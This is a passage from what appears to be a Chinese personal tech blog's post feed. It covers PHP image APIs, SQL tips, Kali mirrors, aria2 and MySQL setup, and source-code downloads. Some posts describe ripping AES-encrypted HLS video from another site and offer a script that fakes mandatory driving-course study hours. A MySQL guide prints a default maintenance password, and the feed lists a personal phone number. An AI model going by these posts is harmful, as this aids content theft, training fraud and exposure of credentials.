4k图片：36\n军事：22\n其它参数自己试试吧\n","date":"2018-12-13T18:00:00Z","permalink":"https://blog.aaayun.cc/archives/208.html","title":"PHP360随机壁纸图片接口，PHP随机图片API"},{"content":"\n单网页版四合一图床上传，目前新Api已基本构架完毕，公共接口40+，点开网页即可上传，简单方便\n下载直通车\n","date":"2018-12-11T23:17:00Z","permalink":"https://blog.aaayun.cc/archives/201.html","title":"单网页四合一图床上传源码"},{"content":"绚丽彩虹同学录是一款清新简洁的同学录程序\n几分钟内搭建您的电子同学录\n高安全性，无需担心数据泄露\n分享活动照片，美好回忆\n注册需班级密码，防止他人窥窃\n强大的管理员控制台，各种功能随心定制\n演示地址:http://demo.txl.xlch8.cn\n像纸质同学录一样保留您的回忆！\n同学录、留言板、相册三大功能，扁平化清新风格。\n1.同学录\n传统纸质同学录加以现代化的互联网图片技术，让您可以充分地展示自我，也和查看别人的的同学录，功能非常全面。\n2.相册\n自由地上传图片并让同学查看，所有照片均不压缩原图永久保存，不像QQ那样即压缩还有丢失的风险。\n3.留言板\n不知不觉毕业了，给老同学评价一下对方的特点，是幽默滑稽，还是高冷内涵？几十个字，藏着的却是三年的时光。\n4.班级中心\n快速地浏览整个同学录网站的最新消息，不错过任何值得珍惜的珍贵回忆。\n5.控制中心\n同学录管理员、班主任等具有管理权限的用户可以对同学录数据进行管理。\n细节\n细节注定成败\n1.安全数据存储方式，无需担心数据丢失或被窃\n2.使用Bootstrap框架，任意设备均能兼容\n3.Pjax页面切换无刷新，增强使用体验\n4.精心设计页面布局，使用不同设备得到同样的体验\n5.不同主题颜色，表达不同心情\n6.控制台一键管理站点数据，启用/禁用功能\n清新设计\n同学录使用扁平化设计风格\n在满足功能需求的前提下仍使用极简清新风格。\n扁平化，符合现代审美观，小清新，使眼睛不再疲惫\n极简\n只给为您提供您需要的\n·信息齐全\n·自由扩展\n·轻松管理\n·安全保障\n同纸质同学录一样\n同学们可以填写生日、性别、座右铭、星座、体重、身高、性格、社交账号、喜好、地址等信息。\n如果您具备一定的开发水平，您也可以自定义信息字段。\n自动更新\n内置自动更新功能，可查看更新日志，以及一键更新到最新版本。\n下载直通车\n","date":"2018-12-11T18:50:00Z","permalink":"https://blog.aaayun.cc/archives/187.html","title":"绚丽彩虹同学录php源码V1.4公测版"},{"content":"接口地址：https://api.aaayun.cc/?type=Image\u0026file=BaiDuRand\u0026class=美女\u0026sub=写真\n参数sub可不填写\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function image($class, $sub = \u0026#39;\u0026#39;, $rand = 1000) { $i = rand(0, $rand); $url = \u0026#34;http://image.baidu.com/data/imgs?pn=0\u0026amp;rn=18\u0026amp;col=%E5%A3%81%E7%BA%B8\u0026amp;tag={$class}\u0026amp;tag3={$sub}\u0026amp;width=0\u0026amp;height=0\u0026amp;ic={$i}\u0026amp;ie=utf8\u0026amp;oe=utf-8\u0026amp;image_id=\u0026amp;fr=channel\u0026amp;p=channel\u0026amp;from=1\u0026amp;app=img.browse.channel.wallpaper\u0026amp;t=0.08688646721576121\u0026#34;; $content = file_get_contents($url); $Json = json_decode($content, 1); $Num = count($Json[\u0026#39;imgs\u0026#39;]); $Arrnum = rand(0,$Num-2); return $Json[\u0026#39;imgs\u0026#39;][$Arrnum][\u0026#39;imageUrl\u0026#39;]; } $img = image(\u0026#39;动漫美女\u0026#39;); $suff = ltrim(strrchr($img, \u0026#39;.\u0026#39;), \u0026#39;.\u0026#39;); header(\u0026#34;content-type:image/{$suff}\u0026#34;); echo file_get_contents($img); ","date":"2018-12-11T01:30:00Z","permalink":"https://blog.aaayun.cc/archives/183.html","title":"PHP百度随机壁纸图片接口，PHP随机图片API"},{"content":"HTTP（Hypertext Transfer Protocol）超文本传输协议是用来在Internet上传送超文本的传送协议，它可以使浏览器更加高效，使网络传输减少。但HTTP协议采用明文传输信息，存在信息窃听、信息篡改和信息劫持的风险。\nHTTPS(Secure Hypertext Transfer Protocol) 安全超文本传输协议是一个安全的通信通道，它基于HTTP开发，用于在客户计算机和服务器之间交换信息。HTTPS使用安全套接字层(SSL)进行信息交换，简单来说HTTPS是HTTP的安全版，是使用TLS/SSL加密的HTTP协议。\nHTTPS是加密传输协议，HTTP是明文传输协议;\nHTTPS需要用到SSL证书，而HTTP不用;\nHTTPS标准端口443，HTTP标准端口80;\nHTTPS基于传输层，HTTP基于应用层;\n什么是SSL？\nSSL是指安全套接层协议（以及传输层协议TLS），位于TCP/IP协议与各种应用层协议之间，为数据通讯提供安全支持，是目前使用最广泛的安全协议。它为互联网或内部网络连接，进行操作的两台机器之间提供安全信息通道，即HTTPS。\n1.1 数据传输期间，对信息进行加密\n1.2通过唯一的SSL凭据识别证书所有者身份。\n1.3先验证证书所有者身份，再颁发SSL证书。\n什么是SSL数字证书（SSL证书）？\n数字证书的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。SSL 证书就是遵守 SSL协议，由受信任的数字证书颁发机构CA（如GlobalSign，wosign），在验证服务器身份后颁发，具有服务器身份验证和数据传输加密功能。\nCA：\n即证书授权中心（CA, Certificate Authority）。CA是负责签发证书、认证证书、管理已颁发证书的机关。用户向CA提出申请后，CA负责审核用户信息，然后对关键信息利用私钥进行”签名”，并公开对应的公钥。客户端可以利用公钥验证签名。\nCSR：\nCSR（Certificate Signing Request）即证书请求文件，也就是证书申请者在申请数字证书时由CSP（加密服务提供者）在生成私钥的同时也生成证书请求文件，证书申请者只要把CSR文件提交给证书颁发机构后，证书颁发机构使用其根证书私钥签名就生成了证书公钥文件，也就是颁发给用户的证书。\n使用ssl证书优势？\n谷歌从 2017 年1月1日起，Chrome 浏览器将会对未进行HTTPS加密的网站标记为「不安全」网站；\n同时苹果App Store的所有iOS应用将强制采用ATS标准，也就是强制使用 HTTPS；\n在国内热火朝天的小程序也要求必须使用 HTTPS 请求。\n1.防流量劫持\n全站Https是根治运营商、中间人流量劫持的解决方案，不仅可以杜绝网页中被插入的小广告，更可以保护用户隐私安全。\n2.提升搜索排名\n采用Https可以帮忙搜索排名的提升，提高站点的可信度和品牌形象。\n3.杜绝钓鱼网站\nHttps地址栏绿色图标可以帮助用户识别出钓鱼网站，保障用户和企业的利益不受损害，增强用户信任。\n","date":"2018-12-11T00:18:08Z","permalink":"https://blog.aaayun.cc/archives/180.html","title":"HTTP和HTTPS有什么区别？"},{"content":"老实人：“为什么你们女人都喜欢油腔滑调的男人，不喜欢我们老实人？”\n女神：“你们老实人根本不解风情。”\n老实人：“我们又怎样不解风情了，你现在给我解释清楚。”\n女神：“你晚上到我家，我慢慢解释给你听。”\n老实人：“我现在就要听你解释！\n","date":"2018-12-10T05:20:23Z","permalink":"https://blog.aaayun.cc/archives/179.html","title":"解释"},{"content":"leafpad /etc/apt/sources.list\n2018.10.19日更新:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学 deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #官方源 deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib --------------------------------------------------------------------------------------------------------------------------------------- -----Kali 2.0+ ---更新源--- #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb http://mirrors.aliyun.com/kali-security kali-rolling/updates main contrib non-free #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 将新的Kali源粘贴进去，同时将官方源用#号注释掉。\n再：\n1 2 3 apt-get dist-upgrade apt-get update \u0026amp; apt-get upgrade apt-get clean ","date":"2018-12-08T22:20:00Z","permalink":"https://blog.aaayun.cc/archives/164.html","title":"Kali 2.0最新国内源:阿里云，中科大"},{"content":"现在许多资源大家都是存在网络上的各个网盘之中尤其是百度网盘资源特别多。个别资源在各个名搜索如百度中并不能搜索到，就算搜到也有不少不能下载的。网盘搜索 资源比较靠谱，以前云盘精灵在的时候各类资源均能搜索到。现在罗列了一些网上的网盘搜索网站试试有没有比较另类的资源呢。\n★★★★★\n*盘多多：http://www.panduoduo.net\n*去转盘：http://www.quzhuanpan.com\n*Bdsola: http://www.3134.cc\n*西林街：http://www.xilinjie.com\n★★★★\n*探索云盘搜索：http://tansuo233.com\n*BDY搜：http://www.bdysou.com\n*盘窝窝：http://www.panww.com\n*百度网盘搜索：http://uzi8.cn\n*网盘007：https://wangpan007.com\n★★★\n*胖次：http://www.panc.cc\n*盘搜搜：http://www.pansoso.com\n*番茄搜索：https://www.fqsousou.com\n*微友搜索：http://www.weiyoou.com\n*凌风云：https://www.lingfengyun.com\n*盘优搜：http://www.panuso.comsoso\n*云盘：http://www.sosoyunpan.com\n*特百度：http://www.tebaidu.com\n*搜百度盘：http://www.sobaidupan.com\n*pan115:http://www.pan115.com\n*鸵鸟搜索：http://www.tuoniao.me\n*我的盘：http://www.wodepan.com\n*搜网盘：http://www.swangpan.com\n*51菜场：http://wx01.51caichang.com\n*网盘之家：http://www.wangpanzhijia.net\n*及搜盘：http://www.jisoupan.com\n*众人搜索：http://wangpan.renrensousuo.com\n*行笑网： http://www.walksmile.com\n*史莱姆搜索：http://www.slimego.cn\n*百度云盘：http://www.baiduyunpan.com\n*300搜：http://www.3bsou.com\n*58网盘搜索：http://www.58wangpan.com\n*56网盘搜索：http://www.56wangpan.com\n*我搜云：http://www.wosouyun.com\n*91百度盘：http://www.91baidupan.com\n*坑搜：http://www.kengso.com\n*搜盘吧： http://www.sopanba.com\n*搜盘侠： http://www.sopanxia.com\n","date":"2018-12-01T22:22:00Z","permalink":"https://blog.aaayun.cc/archives/162.html","title":"搜集到的各种网盘搜索类站点推荐"},{"content":"\n源码已购买，无版权，全部开源！\n源码使用说明；\n本源码可直接上传，无需安装数据库，源码上传就可以使用！上传可登录后台设置，修改你的相关信息保存即可！本源码支持上传二级目录访问\n提示：若首页更新修改或者是更新源码请在空间服务器删除缓存文件index.html即可\n1、后台登陆:http://你的域名/admin/\n默认账号和密码:admin\n本套源码功能比较多，集合了各种功能体验！引流必备！全网自动更新采集，懒人必备！源码非那些影视源码，此源码包含各种采集功能，如YY舞曲，MV音乐，段子等等采集项目\n空间或服务器运行环境：\n使用源码请将服务器或空间PHP版本切换5.4至5.6版本或更高（建议使用5.6最好）\n更新说明；\n1.更新修复电视直播电脑端解析观看不了bug，恢复缓存功能\n2.恢复优酷娱乐视频，综合片库及娱乐搞笑视频采集（请保持第一条解析接口支持优酷视频解析）\n3.站外资源搜索重新编辑，将增加资源网采集，及搜索资源分开来搜索，附加综合搜索，综合搜索会比较卡，所以建议使用分开来线路搜索比较快！\n4.修复搜索一处错误bug\n注意，如果首页访问卡的话请在空间设置优先级文件排序（index.html、index.php、index.htm）\n视频设置：\n1、侵权设置：在后台找到设置栏目填写如下规则即可\n视频设置:\n直接写【“侵权视频名字”+“侵权视频链接”】\n后台无法进入的同学，请直接打开inc文件夹下aik.config.php文件，修改，添加qq_name字符串，具体详情可以登陆后台有规则\n下载直通车\n","date":"2018-12-01T17:33:00Z","permalink":"https://blog.aaayun.cc/archives/159.html","title":"价值50块钱的智云影视多功能php源码V3.6.6.2版本"},{"content":"今天正式开启影视平台，该网站为视频二次解析，如有侵权请联系我下架\n轻风云影视：https://v.qfy.kim\n邮箱:admin@aaayun.cc\n","date":"2018-11-23T19:10:00Z","permalink":"https://blog.aaayun.cc/archives/153.html","title":"轻风云影视"},{"content":"在sql查询中为了提高查询效率，我们常常会采取一些措施对查询语句进行sql优化，下面总结的一些方法，有需要的可以参考参考\n1.对查询进行优化，应尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引\n2.应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，如：\n1 select id from t where num is null 可以在num上设置默认值0，确保表中num列没有null值，然后这样查询：\n1 select id from t where num=0 3.应尽量避免在 where 子句中使用!=或\u0026lt;\u0026gt;操作符，否则将引擎放弃使用索引而进行全表扫描\n4.应尽量避免在 where 子句中使用 or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，如：\n1 select id from t where num=10 or num=20 可以这样查询：\n1 2 3 select id from t where num=10 union all select id from t where num=20 5.in 和 not in 也要慎用，否则会导致全表扫描，如：\n1 select id from t where num in(1,2,3) 对于连续的数值，能用 between 就不要用 in 了：\n1 select id from t where num between 1 and 3 6.下面的查询也将导致全表扫描：\n1 select id from t where name like \u0026#34;%abc\u0026#34;; 7.应尽量避免在 where 子句中对字段进行表达式操作，这将导致引擎放弃使用索引而进行全表扫描。如：\n1 select id from t where num/2=100 应改为:\n1 select id from t where num=100*2 8.应尽量避免在where子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如：\n1 select id from t where substring(name,1,3)=\u0026#34;abc\u0026#34; 应改为:\n1 select id from t where name like \u0026#34;abc\u0026#34; 9.不要在 where 子句中的“=”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引\n10.在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否则该索引将不会被使用，并且应尽可能的让字段顺序与索引顺序相一致\n11.不要写一些没有意义的查询，如需要生成一个空表结构：\n1 select col1,col2 into #t from t where 1=0 这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：\n1 create table #t 12.很多时候用 exists 代替 in 是一个好的选择：\n1 select num from a where num in(select num from b) 用下面的语句替换：\n1 select num from a where exists(select 1 from b where num=a.num) 13.并不是所有索引对查询都有效，SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时，SQL查询可能不会去利用索引，如一表中有字段sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用\n14.索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定，一个表的索引数最好不要超过6个，若太多则应考虑一些不常使用到的列上建的索引是否有必要\n15.尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销，这是因为引擎在处理查询和连接时会逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了\n16.尽可能的使用 varchar 代替 char ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些\n17.任何地方都不要使用 select from t ，用具体的字段列表代替“”，不要返回用不到的任何字段\n18.避免频繁创建和删除临时表，以减少系统表资源的消耗\n","date":"2018-11-19T22:21:00Z","permalink":"https://blog.aaayun.cc/archives/152.html","title":"sql优化的几种方式"},{"content":"最新地址 https://vclove.cn/archives/492.html\n什么是微信H5支付\nH5支付是指商户在微信客户端外的移动端网页展示商品或服务，用户在前述页面确认使用微信支付时，商户发起本服务呼起微信客户端进行支付\n主要用于触屏版的手机浏览器请求微信支付的场景。可以方便的从外部浏览器唤起微信支付\n开发流程\n1、用户在商户侧完成下单，使用微信支付进行支付\n2、由商户后台向微信支付发起下单请求（调用统一下单接口）注：交易类型trade_type=MWEB\n3、统一下单接口返回支付相关参数给商户后台，如支付跳转url（参数名“mweb_url”），商户通过mweb_url调起微信支付中间页\n4、中间页进行H5权限的校验，安全性检查（此处常见错误请见下文）\n5、如支付成功，商户后台会接收到微信侧的异步通知\n6、用户在微信支付收银台完成支付或取消支付，返回商户页面（默认为返回支付发起页面）\n7、商户在展示页面，引导用户主动发起支付结果的查询\n8、商户后台判断是否接到收微信侧的支付结果通知，如没有，后台调用订单查询接口确认订单状态\n9、展示最终的订单支付结果给用户\n相信大家都用过企鹅的sdk吧，那酸爽让人难以接受\nh5的支付我就不给大家截图了，看调用方式就知道了\nAPP签名结果\n微信支付类库下载地址：wepay.tar.gz\n","date":"2018-11-13T17:20:00Z","permalink":"https://blog.aaayun.cc/archives/147.html","title":"微信支付类（含h5支付、APP二次签名）"},{"content":"配置环境：deepin 15.7\n1.基础软件的安装\n在下载Aria2之前先安装一些基础必备的软件：git、screen、nodejs-legacy，在终端下输入命令\n1 sudo apt-get install git screen nodejs-legacy 2.下载安装Aria2\n1 sudo apt-get install aria2 3.下载Aria2WebUI\n1 git clone https://github.com/ziahamza/webui-aria2.git 4.设置Aria2监听rpc，启动WebUI\n1 screen -S aria2 新建一个名为aria2的会话\n在新的会话中输入：\n1 aria2c --enable-rpc --rpc-listen-all --rpc-secret 123456 注意：参数–rpc-secret 后面的字符串是自己自定义的token密码，要记住！要记住！要记住！\n执行后会显示：\n1 2 3 root@anderyly-PC:~# aria2c --enable-rpc --rpc-listen-all --rpc-secret 123456 11/12 15:10:28 [NOTICE] IPv4 RPC: listening on TCP port 6800 11/12 15:10:28 [NOTICE] IPv4 RPC: listening on TCP port 6800 记住port后面的端口号“6800”\n然后依次按下键盘的ctrl、A、D 这三个键，回到前一个会话，输入\n1 screen -S webui 新建一个名为webui的会话\n在新的会话中，先跳转到上面说的webui-aria2目录中，再输入启动命令\n1 2 3 root@anderyly-PC:~# cd webui-aria2 root@anderyly-PC:~/webui-aria2# node node-server.js WebUI Aria2 Server is running on http://localhost:8888 出现WebUI Aria2 Server is running on http://localhost:8888说明WebUI已经启动成功，访问 http://YourIP:8888 即可进入Web界面\n还是依次按下键盘的ctrl、A、D 这三个键，回到前一个会话，如果是用ssh客户端（如Putty）登陆的会话，这个时候就可以关闭这个会话了。\n5.进入WebUI界面，通过rpc接口连接Aria2,填写令牌保存即可使用\n","date":"2018-11-12T23:02:00Z","permalink":"https://blog.aaayun.cc/archives/143.html","title":"在Ubuntu上用aria2和Aria2WebUI实现远程多线程下载"},{"content":"Restful API是目前比较成熟的一套互联网应用程序的API设计理念，Rest是一组架构约束条件和原则，如何Rest约束条件和原则的架构，我们就称为Restful架构，Restful架构具有结构清晰、符合标准、易于理解以及扩展方便等特点，受到越来越多网站的采用！\nRestful API接口规范包括以下部分：\n一、协议\nAPI与用户的通信协议，总是使用HTTPs协议。\n二、域名\n应该尽量将API部署在专用域名之下，如https://api.oldboyedu.com；如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下，如https://oldboyedu.com/api/。\n三、版本\n可以将版本号放在HTTP头信息中，也可以放入URL中，如https://api.oldboyedu.com/v1/\n四、路径\n路径是一种地址，在互联网上表现为网址，在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的\u0026quot;集合\u0026quot;（collection），所以API中的名词也应该使用复数，如https://api.oldboyedu.com/v1/students。\n五、HTTP动词\n对于资源的具体操作类型，由HTTP动词表示，HTTP动词主要有以下几种，括号中对应的是SQL命令。\nGET（SELECT）：从服务器取出资源（一项或多项）； POST（CREATE）：在服务器新建一个资源； PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）； PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）； DELETE（DELETE）：从服务器删除资源； HEAD：获取资源的元数据； OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。 六、过滤信息\n如果记录数量很多，服务器不可能都将它们返回给用户，API会提供参数，过滤返回结果，常见的参数有：\n?limit=20：指定返回记录的数量为20； ?offset=8：指定返回记录的开始位置为8； ?page=1\u0026amp;per_page=50：指定第1页，以及每页的记录数为50； ?sortby=name\u0026amp;order=asc：指定返回结果按照name属性进行升序排序； ?animal_type_id=2：指定筛选条件。 七、状态码\n服务器会向用户返回状态码和提示信息，以下是常用的一些状态码：\n200 OK – [GET]：服务器成功返回用户请求的数据； 201 CREATED – [POST/PUT/PATCH]：用户新建或修改数据成功； 202 Accepted – [*]：表示一个请求已经进入后台排队（异步任务）； 204 NO CONTENT – [DELETE]：用户删除数据成功； 400 INVALID REQUEST – [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作； 401 Unauthorized – [*]：表示用户没有权限（令牌、用户名、密码错误）； 403 Forbidden – [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的； 404 NOT FOUND – [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作； 406 Not Acceptable – [GET]：用户请求的格式不可得； 410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的； 422 Unprocesable entity – [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误； 500 INTERNAL SERVER ERROR – [*]：服务器发生错误，用户将无法判断发出的请求是否成功。 八、错误处理\n如果状态码是4xx，就会向用户返回出错信息，一般来说，返回的信息中将error作为键名，出错信息作为键值。\n九、返回结果\n针对不同操作，服务器向用户返回的结果应该符合以下规范：\nGET /collection：返回资源对象的列表（数组）； GET /collection/resource：返回单个资源对象； POST /collection：返回新生成的资源对象； PUT /collection/resource：返回完整的资源对象； PATCH /collection/resource：返回完整的资源对象； DELETE /collection/resource：返回一个空文档。 十、Hypermedia API\nRESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么。\n以上是Restful API设计应遵循的十大规范，除此之外，Restful API还需注意身份认证应该使用OAuth 2.0框架，服务器返回的数据格式，应该尽量使用JSON，避免使用XML。\n","date":"2018-10-21T04:37:00Z","permalink":"https://blog.aaayun.cc/archives/142.html","title":"Restful API规范详解"},{"content":"mysql已经安装完毕，但安装过程没有让你填写密码，链接错误，那么就来看看以下命令吧\n1.首先获取root权限\n1 anderyly@anderyly-PC:～*su 2.检查mysql是否已运行\n1 root@anderyly-PC:～#netstat -tap | grep mysql 3.查询默认的用户名和密码,user是用户名，password后面的是密码\n1 root@anderyly-PC:～#vim /etc/mysql/debian.cnf 4.利用默认账号密码登录\n1 mysql -u debian-sys-maint -pBIDVYLyCzwpNgK4H 5.更改密码设置\n1 update mysql.user set plugin=\u0026#34;mysql_native_password\u0026#34; where user=\u0026#34;root\u0026#34;; 6.设置root的密码\n1 update mysql.user set authentication_string=password(\u0026#39;这里是你的密码\u0026#39;) where user=\u0026#39;root\u0026#39;and Host = \u0026#39;localhost\u0026#39;; 7.退出数据库\n1 exit; 8.重启mysql\n1 root@anderyly-PC:~#service mysql restart ","date":"2018-10-01T18:01:00Z","permalink":"https://blog.aaayun.cc/archives/139.html","title":"deepin15.7上安装mysql(解决不提示设置密码的问题)"},{"content":"本人好友(骚木)给了一个网站发现视频资源不错，准备给扒下来\n准备编辑器、fd、浏览器\n1.启动fd，访问视频站，看一段视频，让它发送包，先放着不动\n2.查看源码执行ctrl+f输入video查找，播放器src指向.m3u8文件\n3.下载后用编辑器打开，咦，这是什么格式，查阅google资料，原来是hls视频\n4.看一下抓的包，原来是把第3步最后一行作为参数，继续去浏览器下载，果然如此，把.ts文件全部下载本地就能整合成视频了\n5.仔细看了一下发送的请求并返回的包，咦，这是什么，怎么有一行字符串，返回第4步看了一下差点漏了这一行：\nEXT-X-KEY:METHOD=AES-128,URI=\u0026ldquo;key.key\u0026rdquo; 上帝请原谅我看不懂，大概意思是经过aes-128加密的，那一行字符串应该就是秘钥\n抓包到此结束接下来用python获取文件并多线程下载，下载完成后用秘钥解密整合ts就成mp4啦\n","date":"2018-09-09T08:06:00Z","permalink":"https://blog.aaayun.cc/archives/129.html","title":"一次差点放弃的抓包"},{"content":"我们是附近互相喜欢认识的，成为好友时间为5号，过了一天，刚下班和我要钱冲个会员，可以，但给我理由啊，虽然化妆后有点漂亮，但我还是需要一个让我信服的理由。有图有真相\n","date":"2018-09-07T03:03:00Z","permalink":"https://blog.aaayun.cc/archives/126.html","title":"揭露一个小骗子"},{"content":"这是不是你现在的生活状态，别不承认\n","date":"2018-08-01T21:24:00Z","permalink":"https://blog.aaayun.cc/archives/118.html","title":"生活状态"},{"content":"截图预览\n本次更新解决了关键字，以及模板响应速度慢问题\n源码介绍：\n1.增加时间限制\n2.增加授权到期短信提醒\n3.重写黑名单系统\n4.增加二次认证\n注：使用本系统必须开启rewrite模块，否则会使用失败，此授权系统使用AYPHP1.3框架\n此系统去除了在线打包下载以及QQ扫描验证，采用了短信sdk更适合商业用途，此系统将不定时更新，如发现漏洞请及时反馈\n使用方法：\n1.安装需要把auth.sql导入数据库\n2.更改/application/Configs/database.php，这是链接数据库的参数，必须更改\n3.把核心代码复制到你需要授权的系统数据库操作文件\n4.监控http://域名//Job/index/key=密匙(监控速度无需多快)\n密匙在后台更改\n5.把tool.php放在源码根目录中【非必须】\n(此源码方便放置密匙，如果核心代码密匙路径更改，此源码密匙路径也要更改)\n6.使用短信sdk需在ay/common/sms/sms100.php更改key以及模板参数，获取key请登入100sms.cn\n用户授权只需按时缴纳费用和放置密匙即可正常访问网站，\n如授权即将到期本程序将自动下发短信给用户让缴费，\n密匙防止已授权用户将自己的授权源码给他人使用的黑名单系统\n注意网站运行后/readme目录需删除\n下载直通车\n","date":"2018-07-22T22:24:00Z","permalink":"https://blog.aaayun.cc/archives/116.html","title":"轻风云授权系统1.1【更新】"},{"content":"正式开启接单模式:\n动态网站、二次开发、环境搭建、数据库优化、源码搭建\n联系方式:\nmeto:云青\nphone:17712945530\nwechat:Anderyly\nmail:admin@aaayun.cc\n","date":"2018-07-15T22:40:10Z","permalink":"https://blog.aaayun.cc/archives/114.html","title":"开启接单"},{"content":"甲:建立博客的意义何在?\n乙:单身程序狗解决了一个技术难题后没有妹子可以炫耀或夸一下自己怎么办?\n","date":"2018-06-28T01:31:23Z","permalink":"https://blog.aaayun.cc/archives/113.html","title":"建立博客的意义"},{"content":"截图预览:\n此程序由云青二开，优化后台代码以及支持php5.3以上支持(原开发者后台开发手法太粗糙，函数乱用)\n程序原先为1.0版本，现在为1.1版本，后续有空将会更新\n【安装说明】\n1.修改数据库配置文件“/include/config.php”，配置好数据库信息\n2.将数据库文件“bb.sql”上传到数据库\n3.将程序的全部目录及文件传输至网站主机根目录\n4.进入后台域名/admin/，配置网站信息\n备注：\n后台账号：admin\n后台密码：admin\n后台目录：/admin（可自行修改）\n下载直通车\n","date":"2018-06-27T21:59:00Z","permalink":"https://blog.aaayun.cc/archives/108.html","title":"[二开]校园表白墙"},{"content":" 博主本人考驾照，科目一学时真的是看的难受，所以制作了这个脚本，顺便送给驾校\n亲测无bug，自动刷30学识，此为第三版，全自动做单选和多选题\n使用分辨率最佳为 720*1280，建议使用逍遥模拟器实现\n使用方法：\n模拟器安装好理论培训和科一辅助app，打开辅助app并启动，然后打开理论培训并登入好完成绑定手机，选择需要看的视频即可\n下载直通车\n","date":"2018-06-20T03:16:00Z","permalink":"https://blog.aaayun.cc/archives/102.html","title":"科目一刷学时脚本"},{"content":"\n","date":"2018-06-05T07:55:00Z","permalink":"https://blog.aaayun.cc/archives/95.html","title":"当处男和处女在一起嘿嘿是什么体验？"},{"content":"PHP框架的原理\n说到PHP框架，可能很多PHP新手会感到有些胆怯。其实，PHP框架也不是那么深不可测的，框架就是别人使用PHP基础只是为你写好了的东西，只是封装在一起；这就好比我们使用PHP的函数，函数都是已近写好了的，我们只要按照函数使用的规则，比如，为函数传递参数的个数、类型以及函数返回的值类型等。理解了PHP函数的这些使用规则，我们就可以大胆、放心的去使用了。同样道理，PHP框架也有自己的规则，比如项目文件夹的部署、控制器类的命名规则以及数据表的命名规则等。了解了PHP框架的使用规则我们就能去使用PHP框架提供的全部功能了。\nPHP框架并不是那么高不可攀，每位PHP程序员都应该加入到PHP框架的学习和使用中来，毕竟一个人的精力是有限的，如何你每个项目都全部由自己开发的话，那么你将浪费许多时间用在做相同的事情上。比方说，几乎每个项目都有数据的验证，那么你要为每个项目都要编写数据验证的PHP代码，而如果你使用PHP框架的话，这些都是封装了可以直接拿来使用的。\nPHP框架也是使用PHP的基本知识来写的，没有必要看到框架二字就退缩了。对PHP基础知识非常熟悉的话，学习PHP框架是件轻松而快乐的事情。框架的使用会给你的项目节省50%左右的项目周期时间。\nPHP框架的优点\n1、PHP框架使代码更安全。一般PHP框架都采用单入口文件的模式，我们只要在入口文件进行验证即达到了所有文件验证的目的。\n2、PHP框架缩短了项目开发周期，这可能是最大的优点了。\n3、使用PHP框架架构项目思路清晰、结构明显。\nPHP框架选择标准\n在如此多的PHP 